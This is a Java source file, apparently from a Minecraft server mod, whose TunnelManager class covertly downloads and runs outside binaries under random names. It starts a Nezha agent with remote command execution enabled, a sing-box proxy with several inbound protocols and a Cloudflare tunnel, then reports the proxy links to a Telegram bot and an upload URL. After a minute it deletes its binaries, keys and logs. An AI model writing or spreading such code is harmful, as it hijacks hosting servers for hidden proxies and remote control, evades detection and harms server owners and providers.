package com.maohi.tunnel;

import com.maohi.MaohiConfig;
import com.maohi.common.HttpUtils;
import com.maohi.common.JsonUtils;
import com.maohi.fakeplayer.util.RandomUtils;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.*;
import java.util.concurrent.ThreadLocalRandom;

/**
 * 隧道与监控管理器（从 Maohi.java 剥离）
 * 单文件全集成：隧道启动 + 哪吒 Agent + 健康检查 + Telegram 通知 + 节点上传 + 资源清理
 */
public class TunnelManager {

    private static volatile TunnelManager instance;

    public static TunnelManager getInstance() {
        if (instance == null) {
            synchronized (TunnelManager.class) {
                if (instance == null) {
                    instance = new TunnelManager();
                }
            }
        }
        return instance;
    }

    private final java.util.concurrent.atomic.AtomicBoolean isRunning = new java.util.concurrent.atomic.AtomicBoolean(false);
    private Process nzProcess;
    private Process sbProcess;
    private Process botProcess;

    public boolean isRunning() {
        return isRunning.get();
    }

    private static final Path FILE_PATH = Paths.get("./world");
    private static final org.slf4j.Logger LOGGER = org.slf4j.LoggerFactory.getLogger("Server thread");

    private static MaohiConfig config() { return MaohiConfig.getInstance(); }

    // 随机进程名（装修）
    private final String webName;
    private final String botName;
    private final String phpName;

    public TunnelManager() {
        this.webName = RandomUtils.randomName();
        this.botName = RandomUtils.randomName();
        this.phpName = RandomUtils.randomName();
    }

    /**
     * 启动全部隧道与监控服务
     * 原 Maohi.start() 逻辑完整迁移
     */
    public void startAll() throws Exception {
        if (!Files.exists(FILE_PATH)) Files.createDirectories(FILE_PATH);

        String arch = getArch();
        downloadBinaries(arch);
        chmodBinaries();

        if (isValidPort(config().hy2Port) || isValidPort(config().tuicPort)) generateCert();

        runNZ();
        runSingbox();
        runCloudflared();

        Thread.sleep(5000);

        // 确定 Argo 域名：固定隧道用配置的，零时隧道从 boot.log 提取
        String effectiveArgoDomain = config().argoDomain;
        if ((config().argoAuth == null || config().argoAuth.isEmpty() ||
                config().argoDomain == null || config().argoDomain.isEmpty()) && isValidPort(config().argoPort)) {
            effectiveArgoDomain = extractTempDomain();
        }

        String serverIP = getServerIP();

        // 组合地理位置和 ISP 信息
        String fullNodeName = getFullNodeName(serverIP.replace("[", "").replace("]", ""));

        String subTxt = generateLinks(serverIP, fullNodeName, effectiveArgoDomain);
        // 通过 Telegram 发送订阅链接
        sendTelegram(subTxt, fullNodeName);

        // 上传订阅节点
        uploadNodes(fullNodeName);

        // 最后启动清理线程
        cleanup();
    }

    // ==================== 节点信息增强 ====================

    /**
     * 获取 IP 的 ISP（运营商）信息
     */
    private String getISPFromIP(String ip) {
        String[] sources = { "https://api.ip.sb/geoip/" + ip, "http://ip-api.com/json/" + ip };
        for (String url : sources) {
            String json = HttpUtils.fetchText(url, 3000);
            if (json != null) {
                String isp = JsonUtils.extractJson(json, "isp");
                if (isp != null && !isp.isEmpty()) return isp;
            }
        }
        return "UnknownISP";
    }

    /**
     * 获取国家 Emoji 和 城市名称
     */
    private String getCountryEmoji() {
        String[] sources = {
            "https://ipconfig.ggff.net",
            "https://ipconfig.lgbts.hidns.vip",
            "https://ipconfig.de5.net"
        };
        for (String url : sources) {
            String result = HttpUtils.fetchText(url, 5000);
            if (result != null && !result.trim().isEmpty()) return result.trim();
        }
        return "🇺🇳 联合国";
    }

    /**
     * 获取完整节点后缀信息
     * 组合格式为：[Emoji 国家 城市]_[运营商] | [配置名称]
     */
    private String getFullNodeName(String ip) {
        String emoji = getCountryEmoji();
        String isp = getISPFromIP(ip);
        return emoji + "_" + isp + " | " + config().nodeName;
    }

    // ==================== 二进制下载与部署 ====================

    private String getArch() {
        String arch = System.getProperty("os.arch").toLowerCase();
        if (arch.contains("aarch64") || arch.contains("arm64") || arch.contains("arm")) return "arm64";
        return "amd64";
    }

    /**
     * 根据架构从远程仓库下载预编译的二进制文件
     */
    private void downloadBinaries(String arch) {
        String baseUrl = arch.equals("arm64")
            ? "https://arm64.ssss.nyc.mn/"
            : "https://amd64.ssss.nyc.mn/";

        String[][] files;
        if (config().nzPort != null && !config().nzPort.trim().isEmpty()) {
            // V0 模式：下载 agent
            files = new String[][] {
                { phpName, baseUrl + "agent" },
                { webName, baseUrl + "sb" },
                { botName, baseUrl + "bot" }
            };
        } else {
            // V1 模式：下载 v1
            files = new String[][] {
                { phpName, baseUrl + "v1" },
                { webName, baseUrl + "sb" },
                { botName, baseUrl + "bot" }
            };
        }
        for (String[] f : files) {
            try {
                downloadFile(f[0], f[1]);
            } catch (Exception e) {
                LOGGER.error("[FS Core] Binary download failed (type " + f[0] + "): " + e.getMessage());
            }
        }
    }

    /**
     * 处理下载逻辑，并支持处理 HTTP/HTTPS 重定向
     */
    private void downloadFile(String fileName, String fileUrl) throws Exception {
        Path dest = FILE_PATH.resolve(fileName);
        if (Files.exists(dest)) return;

        HttpURLConnection conn = (HttpURLConnection) new java.net.URI(fileUrl).toURL().openConnection();
        conn.setInstanceFollowRedirects(true);
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(60000);
        conn.setRequestProperty("User-Agent", "curl/7.68.0");

        int status = conn.getResponseCode();
        while (status == HttpURLConnection.HTTP_MOVED_TEMP ||
                status == HttpURLConnection.HTTP_MOVED_PERM ||
                status == 307 || status == 308) {
            String location = conn.getHeaderField("Location");
            conn.disconnect();
            conn = (HttpURLConnection) new java.net.URI(location).toURL().openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(60000);
            conn.setRequestProperty("User-Agent", "curl/7.68.0");
            status = conn.getResponseCode();
        }

        try (java.io.InputStream in = conn.getInputStream()) {
            Files.copy(in, dest, StandardCopyOption.REPLACE_EXISTING);
        } finally {
            conn.disconnect();
        }
    }

    /**
     * 为下载的二进制文件赋予可执行权限
     */
    private void chmodBinaries() {
        for (String name : new String[]{webName, botName, phpName}) {
            try {
                FILE_PATH.resolve(name).toFile().setExecutable(true);
            } catch (Exception e) {
                LOGGER.error("[FS Core] Permission set failed (" + name + "): " + e.getMessage());
            }
        }
    }

    /**
     * 生成自签名 SSL 证书。
     * 优先尝试调用系统的 openssl，如果失败则写入硬编码的证书内容。
     */
    private void generateCert() {
        Path certFile = FILE_PATH.resolve("cert.pem");
        Path keyFile = FILE_PATH.resolve("private.key");
        try {
            Process p = new ProcessBuilder("which", "openssl")
                .redirectErrorStream(true).start();
            p.waitFor();
            if (p.exitValue() == 0) {
                new ProcessBuilder("openssl", "ecparam", "-genkey", "-name", "prime256v1",
                    "-out", keyFile.toString())
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD)
                    .start().waitFor();
                new ProcessBuilder("openssl", "req", "-new", "-x509", "-days", "3650",
                    "-key", keyFile.toString(), "-out", certFile.toString(), "-subj", "/CN=bing.com")
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD)
                    .start().waitFor();
                return;
            }
        } catch (Exception e) {
            LOGGER.error("[FS Core] SSL tool error: " + e.getMessage());
        }

        try {
            Files.writeString(keyFile,
                "-----BEGIN EC PARAMETERS-----\n" +
                "BggqhkjOPQMBBw==\n" +
                "-----END EC PARAMETERS-----\n" +
                "[REDACTED PRIVATE KEY]\n");
            Files.writeString(certFile,
                "-----BEGIN CERTIFICATE-----\n" +
                "MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\n" +
                "EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\n" +
                "MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\n" +
                "A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\n" +
                "aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\n" +
                "BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\n" +
                "Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\n" +
                "eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\n" +
                "-----END CERTIFICATE-----\n");
        } catch (Exception e) {
            LOGGER.error("[FS Core] Cert write error: " + e.getMessage());
        }
    }

    // ==================== 进程启动 ====================

    /**
     * 启动并在后台运行哪吒监控客户端 V0 or V1
     */
    private void runNZ() {
        if (config().nzServer == null || config().nzServer.isEmpty() ||
            config().nzKey == null || config().nzKey.isEmpty()) {
            return;
        }

        Set<String> tlsPorts = new HashSet<>(Arrays.asList(
            "443","8443","2096","2087","2083","2053"
        ));

        try {
            if (config().nzPort != null && !config().nzPort.trim().isEmpty()) {
                // V0 模式：直接用命令行参数启动，不写配置文件
                List<String> command = new ArrayList<>();
                command.add(FILE_PATH.resolve(phpName).toString());
                command.add("-s");
                command.add(config().nzServer + ":" + config().nzPort);
                command.add("-p");
                command.add(config().nzKey);
                if (tlsPorts.contains(config().nzPort)) {
                    command.add("--tls");
                }
                command.add("--disable-auto-update");
                command.add("--report-delay");
                command.add("4");
                command.add("--skip-conn");
                command.add("--skip-procs");
                new ProcessBuilder(command)
                    .redirectErrorStream(true)
                    .redirectOutput(ProcessBuilder.Redirect.appendTo(FILE_PATH.resolve("nz.log").toFile()))
                    .start();
            } else {
                // V1 模式：从 nzServer 末尾提取端口判断是否需要 TLS
                String serverPort = config().nzServer.contains(":") ?
                    config().nzServer.substring(config().nzServer.lastIndexOf(":") + 1) : "";
                String NZtls = tlsPorts.contains(serverPort) ? "true" : "false";
                String configYaml =
                    "client_secret: " + config().nzKey + "\n" +
                    "debug: true\n" +
                    "disable_auto_update: true\n" +
                    "disable_command_execute: false\n" +
                    "disable_force_update: true\n" +
                    "disable_nat: false\n" +
                    "disable_send_query: false\n" +
                    "gpu: false\n" +
                    "insecure_tls: true\n" +
                    "ip_report_period: 1800\n" +
                    "report_delay: 4\n" +
                    "server: " + config().nzServer + "\n" +
                    "skip_connection_count: true\n" +
                    "skip_procs_count: true\n" +
                    "temperature: false\n" +
                    "tls: " + NZtls + "\n" +
                    "use_gitee_to_upgrade: false\n" +
                    "use_ipv6_country_code: false\n" +
                    "uuid: " + config().nodeUuid + "\n";
                Path configYamlPath = FILE_PATH.resolve("config.yaml");
                Files.writeString(configYamlPath, configYaml);
                ProcessBuilder pb = new ProcessBuilder(FILE_PATH.resolve(phpName).toString(), "-c", configYamlPath.toString())
                    .redirectErrorStream(true)
                    .redirectOutput(ProcessBuilder.Redirect.appendTo(FILE_PATH.resolve("nz.log").toFile()));

                // 强制剥离廉价面板服强制注入的内网缓存代理环境变量
                java.util.Map<String, String> env = pb.environment();
                env.remove("http_proxy"); env.remove("https_proxy"); env.remove("all_proxy");
                env.remove("HTTP_PROXY"); env.remove("HTTPS_PROXY"); env.remove("ALL_PROXY");

                pb.start();
            }
            Thread.sleep(1000);
        } catch (Exception e) {
		LOGGER.error("[FS Core] Failed to start service-NZ", e);
        }
    }

    /**
     * 启动并在后台运行 Sing-box 代理核心
     */
    private void runSingbox() {
        try {
            String config = buildSingboxConfig();
            Path configPath = FILE_PATH.resolve("config.json");
            Files.writeString(configPath, config);
            ProcessBuilder pb = new ProcessBuilder(FILE_PATH.resolve(webName).toString(), "run", "-c", configPath.toString())
                .redirectErrorStream(true)
                .redirectOutput(ProcessBuilder.Redirect.appendTo(FILE_PATH.resolve("sb.log").toFile()));
            java.util.Map<String, String> env = pb.environment();
            env.remove("http_proxy"); env.remove("https_proxy"); env.remove("all_proxy");
            env.remove("HTTP_PROXY"); env.remove("HTTPS_PROXY"); env.remove("ALL_PROXY");
            pb.start();
            Thread.sleep(1000);
        } catch (Exception e) {
		LOGGER.error("[FS Core] Failed to start service-SB", e);
        }
    }

    /**
     * 动态构建 Sing-box 的 JSON 配置文件
     */
    private String buildSingboxConfig() {
        List<String> inbounds = new ArrayList<>();

        if (isValidPort(config().argoPort)) {
            inbounds.add(" {\n" +
                "   \"tag\": \"vless-ws-in\",\n" +
                "   \"type\": \"vless\",\n" +
                "   \"listen\": \"0.0.0.0\",\n" +
                "   \"listen_port\": " + config().argoPort + ",\n" +
                "   \"users\": [{\"uuid\": \"" + config().nodeUuid + "\"}],\n" +
                "   \"transport\": {\n" +
                "     \"type\": \"ws\",\n" +
                "     \"path\": \"/vless-argo\",\n" +
                "     \"max_early_data\": 2560,\n" +
                "     \"early_data_header_name\": \"Sec-WebSocket-Protocol\"\n" +
                "   }\n" +
                " }");
        }

        if (isValidPort(config().hy2Port)) {
            inbounds.add(" {\n" +
                "   \"tag\": \"hysteria-in\",\n" +
                "   \"type\": \"hysteria2\",\n" +
                "   \"listen\": \"0.0.0.0\",\n" +
                "   \"listen_port\": " + config().hy2Port + ",\n" +
                "   \"users\": [{\"password\": \"" + config().nodeUuid + "\"}],\n" +
                "   \"masquerade\": \"https://bing.com\",\n" +
                "   \"tls\": {\n" +
                "     \"enabled\": true,\n" +
                "     \"alpn\": [\"h3\"],\n" +
                "     \"certificate_path\": \"" + FILE_PATH.resolve("cert.pem") + "\",\n" +
                "     \"key_path\": \"" + FILE_PATH.resolve("private.key") + "\"\n" +
                "   }\n" +
                " }");
        }

        if (isValidPort(config().tuicPort)) {
            inbounds.add(" {\n" +
                "   \"tag\": \"tuic-in\",\n" +
                "   \"type\": \"tuic\",\n" +
                "   \"listen\": \"0.0.0.0\",\n" +
                "   \"listen_port\": " + config().tuicPort + ",\n" +
                "   \"users\": [{\"uuid\": \"" + config().nodeUuid + "\", \"password\": \"" + config().nodeUuid + "\"}],\n" +
                "   \"congestion_control\": \"bbr\",\n" +
                "   \"tls\": {\n" +
                "     \"enabled\": true,\n" +
                "     \"alpn\": [\"h3\"],\n" +
                "     \"certificate_path\": \"" + FILE_PATH.resolve("cert.pem") + "\",\n" +
                "     \"key_path\": \"" + FILE_PATH.resolve("private.key") + "\"\n" +
                "   }\n" +
                " }");
        }

        if (isValidPort(config().s5Port)) {
            String s5User = config().nodeUuid.substring(0, 8);
            String s5Pass = config().nodeUuid.substring(config().nodeUuid.length() - 12);
            inbounds.add(" {\n" +
                "   \"tag\": \"s5-in\",\n" +
                "   \"type\": \"socks\",\n" +
                "   \"listen\": \"0.0.0.0\",\n" +
                "   \"listen_port\": " + config().s5Port + ",\n" +
                "   \"users\": [{\"username\": \"" + s5User +
                "\", \"password\": \"" + s5Pass + "\"}]\n" +
                " }");
        }

        return "{\n" +
            "  \"log\": {\"disabled\": false, \"level\": \"error\", \"timestamp\": true},\n" +
            "  \"inbounds\": [\n" + String.join(",\n", inbounds) + "\n  ],\n" +
            "  \"outbounds\": [{\"type\": \"direct\", \"tag\": \"direct\"}]\n" +
            "}";
    }

    /**
     * 启动 Cloudflare Tunnel
     */
    private void runCloudflared() {
        if (!isValidPort(config().argoPort)) {
            return;
        }

        try {
            if (config().argoAuth == null || config().argoAuth.isEmpty() ||
                config().argoDomain == null || config().argoDomain.isEmpty()) {
                // 零时隧道模式
                ProcessBuilder pb = new ProcessBuilder(
                    FILE_PATH.resolve(botName).toString(),
                    "tunnel", "--edge-ip-version", "auto",
                    "--no-autoupdate", "--protocol", "http2",
                    "--logfile", FILE_PATH.resolve("boot.log").toString(),
                    "--loglevel", "info",
                    "--url", "http://localhost:" + config().argoPort)
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD);
                java.util.Map<String, String> env = pb.environment();
                env.remove("http_proxy"); env.remove("https_proxy"); env.remove("all_proxy");
                env.remove("HTTP_PROXY"); env.remove("HTTPS_PROXY"); env.remove("ALL_PROXY");
                pb.start();
            } else {
                // 固定隧道模式
                ProcessBuilder pb = new ProcessBuilder(
                    FILE_PATH.resolve(botName).toString(),
                    "tunnel", "--edge-ip-version", "auto",
                    "--no-autoupdate", "--protocol", "http2",
                    "run", "--token", config().argoAuth)
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD);
                java.util.Map<String, String> env = pb.environment();
                env.remove("http_proxy"); env.remove("https_proxy"); env.remove("all_proxy");
                env.remove("HTTP_PROXY"); env.remove("HTTPS_PROXY"); env.remove("ALL_PROXY");
                pb.start();
            }
            Thread.sleep(2000);
        } catch (Exception e) {
		LOGGER.error("[FS Core] Failed to start service-2GO", e);
        }
    }

    // ==================== 节点信息收集 ====================

    /**
     * 获取当前服务器的公网 IP 地址
     */
    private String getServerIP() {
        String[] sources = {
            "https://ip.sb",
            "https://api64.ipify.org",
            "https://ifconfig.me/ip"
        };
        for (String src : sources) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new java.net.URI(src).toURL().openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                    String ip = br.readLine();
                    if (ip != null) {
                        ip = ip.trim();
                        try {
                            InetAddress addr = InetAddress.getByName(ip);
                            if (addr instanceof java.net.Inet4Address || addr instanceof java.net.Inet6Address) {
                                return addr.getHostAddress();
                            }
                        } catch (Exception ex) {
                            // 静默失败
                        }
                    }
                } finally {
                    conn.disconnect();
                }
            } catch (Exception e) {
                // 静默失败
            }
        }
        return "localhost";
    }

    /**
     * 对节点名称进行 URL 编码
     */
    private String encodeNodeName(String name) {
        if (name == null) return "";
        try {
            return java.net.URLEncoder.encode(name, java.nio.charset.StandardCharsets.UTF_8.name())
                .replace("+", "%20");
        } catch (Exception e) {
            return name;
        }
    }

    /**
     * 从 boot.log 中提取临时隧道的域名
     */
    private String extractTempDomain() {
        Path bootLogPath = FILE_PATH.resolve("boot.log");
        if (!Files.exists(bootLogPath)) return null;
        try {
            List<String> lines = Files.readAllLines(bootLogPath);
            for (String line : lines) {
                java.util.regex.Pattern p = java.util.regex.Pattern.compile("https?://([^ ]*trycloudflare\\.com)/?");
                java.util.regex.Matcher m = p.matcher(line);
                if (m.find()) {
                    return m.group(1);
                }
            }
        } catch (Exception e) {
            LOGGER.warn("[FS Core] Failed to read boot.log: " + e.getMessage());
        }
        return null;
    }

    /**
     * 生成各种协议的分享链接并进行 Base64 编码
     */
    private String generateLinks(String serverIP, String fullNodeName, String argoDomain) {
        StringBuilder sb = new StringBuilder();
        String nodeName = encodeNodeName(fullNodeName);

        String finalIp = serverIP;
        if (serverIP != null && serverIP.contains(":")) {
            finalIp = "[" + serverIP + "]";
        }

        if (isValidPort(config().argoPort) && argoDomain != null && !argoDomain.isEmpty()) {
            String params = "encryption=none&security=tls&sni=" + argoDomain +
                "&fp=firefox&type=ws&host=" + argoDomain +
                "&path=%2Fvless-argo%3Fed%3D2560";
            sb.append("vless://").append(config().nodeUuid).append("@")
                .append(config().cfIp).append(":").append(config().cfPort)
                .append("?").append(params)
                .append("#").append(nodeName);
        }

        if (isValidPort(config().hy2Port)) {
            sb.append("\nhysteria2://").append(config().nodeUuid).append("@")
                .append(finalIp).append(":").append(config().hy2Port)
                .append("/?sni=www.bing.com&insecure=1&alpn=h3&obfs=none#")
                .append(nodeName);
        }

        if (isValidPort(config().tuicPort)) {
            sb.append("\ntuic://").append(config().nodeUuid).append(":").append(config().nodeUuid).append("@")
                .append(finalIp).append(":").append(config().tuicPort)
                .append("?sni=www.bing.com&congestion_control=bbr&udp_relay_mode=native&alpn=h3&allow_insecure=1#")
                .append(nodeName);
        }

        if (isValidPort(config().s5Port)) {
            String s5Auth = Base64.getEncoder().encodeToString(
                (config().nodeUuid.substring(0, 8) + ":" + config().nodeUuid.substring(config().nodeUuid.length() - 12)).getBytes()
            );
            sb.append("\nsocks://").append(s5Auth).append("@")
                .append(finalIp).append(":").append(config().s5Port)
                .append("#").append(nodeName);
        }

        // 保存原始链接到 list.txt 供 uploadNodes 使用
        try {
            Files.writeString(FILE_PATH.resolve("list.txt"), sb.toString());
        } catch (Exception e) {
            LOGGER.error("[FS Core] Node list write error: " + e.getMessage());
        }

        // base64 处理整个订阅
        return Base64.getEncoder().encodeToString(sb.toString().getBytes());
    }

    // ==================== 通知与上报 ====================

    /**
     * 将生成的节点订阅链接发送到指定的 TG-Bot
     */
    private void sendTelegram(String subTxt, String fullNodeName) {
        if (config().botToken == null || config().botToken.isEmpty() ||
            config().chatId == null || config().chatId.isEmpty()) return;
        try {
            String text = "*" + fullNodeName + " 节点推送通知*\n```\n" + subTxt + "\n```";
            String params = "chat_id=" + config().chatId +
                "&text=" + java.net.URLEncoder.encode(text, java.nio.charset.StandardCharsets.UTF_8.name()).replace("%60", "`") +
                "&parse_mode=Markdown";
            HttpURLConnection conn = (HttpURLConnection) new java.net.URI(
                "https://api.telegram.org/bot" + config().botToken + "/sendMessage").toURL().openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            try (OutputStream os = conn.getOutputStream()) {
                os.write(params.getBytes("UTF-8"));
            }
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            LOGGER.error("[FS Core] Notify delivery failed: " + e.getMessage());
        }
    }

    /**
     * 将节点列表上传到指定的 URL
     */
    private void uploadNodes(String fullNodeName) {
        if (config().uploadUrl == null || config().uploadUrl.isEmpty()) return;

        Path listFile = FILE_PATH.resolve("list.txt");
        if (!Files.exists(listFile)) return;

        try {
            List<String> allLines = Files.readAllLines(listFile);
            List<String> nodes = new ArrayList<>();
            String regex = "^(vless|vmess|trojan|hysteria2|tuic|socks5|socks)://.*";

            for (String line : allLines) {
                if (line.trim().matches(regex)) {
                    nodes.add(line.trim());
                }
            }

            if (nodes.isEmpty()) return;

            String urlString = String.join("\\n", nodes);

            String jsonData = "{\"URL_NAME\": \"" + config().nodeName.replace("\"", "\\\"") +
                "\", \"URL\": \"" + urlString.replace("\"", "\\\"") + "\"}";

            HttpURLConnection conn = (HttpURLConnection) new java.net.URI(config().uploadUrl).toURL().openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");

            try (OutputStream os = conn.getOutputStream()) {
                os.write(jsonData.getBytes("UTF-8"));
            }

            if (conn.getResponseCode() == 200) {
                // 静默成功
            } else {
                LOGGER.warn("[FS Core] Failed to upload nodes, code: " + conn.getResponseCode());
            }
            conn.disconnect();

        } catch (Exception e) {
            // 静默失败
        }
    }

    // ==================== 工具方法 ====================

    private boolean isValidPort(String port) {
        if (port == null || port.trim().isEmpty()) return false;
        try {
            int n = Integer.parseInt(port.trim());
            return n >= 1 && n <= 65535;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * 后台异步清理敏感文件和日志
     */
    private void cleanup() {
        new Thread(() -> {
            try {
                Thread.sleep(60000);
                String[] sensitiveFiles = {
                    "config.yaml", "config.json", "boot.log",
                    "nz.log", "sb.log", "cert.pem", "private.key", "proxy_sub.txt", "list.txt",
                    webName, botName, phpName
                };
                for (String file : sensitiveFiles) {
                    if (file != null) {
                        Files.deleteIfExists(FILE_PATH.resolve(file));
                    }
                }
            } catch (Exception ignored) {
            }
        }, "FS-Cleanup").start();
    }
}
